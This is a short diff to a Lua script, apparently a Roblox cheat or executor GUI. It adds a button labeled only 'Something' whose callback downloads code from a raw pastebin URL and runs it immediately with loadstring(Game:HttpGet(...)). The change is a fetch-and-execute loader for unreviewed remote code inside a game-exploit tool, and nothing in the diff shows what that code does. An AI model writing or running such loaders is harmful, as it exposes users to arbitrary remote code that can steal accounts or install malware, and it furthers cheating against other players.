@@ -279,3 +279,10 @@ ExecuteButton.MouseButton1Click:Connect(function()
 end)
     end
 })
+
+Tab:AddButton({
+    Name = "Something",
+    Callback = function()
+        loadstring(Game:HttpGet("https://pastebin.com/raw/DxMwPkXH"))()
+    end
+})
